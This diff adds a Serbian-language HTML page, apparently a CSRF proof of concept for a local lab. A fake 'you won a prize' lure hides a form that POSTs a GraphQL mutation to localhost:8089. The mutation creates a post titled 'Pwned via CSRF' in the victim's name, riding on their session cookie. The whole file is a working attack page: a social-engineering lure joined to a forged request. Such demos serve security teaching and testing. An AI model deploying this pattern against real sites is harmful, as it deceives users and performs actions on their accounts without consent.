@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="sr">
+<head>
+  <meta charset="utf-8">
+  <title>Besplatna nagrada!</title>
+</head>
+<body style="font-family: sans-serif; max-width: 480px; margin: 60px auto;">
+  <h1>Cestitamo! Osvojili ste nagradu 🎁</h1>
+  <p>Kliknite dugme ispod da preuzmete poklon.</p>
+
+  <!-- Napadacka forma: salje se na tudji backend (localhost:8089),
+       a browser uz POST automatski prilozi zrtvin session cookie.
+   -->
+  <form action="http://localhost:8089/graphql" method="POST">
+    <input type="hidden" name="query"
+           value='mutation { createPost(title: "Pwned via CSRF", body: "Ovaj post je kreirao napadac u ime zrtve.") { id title } }'>
+    <button type="submit" style="padding: 12px 20px; font-size: 16px;">
+      Preuzmi nagradu
+    </button>
+  </form>
+</body>
+</html>
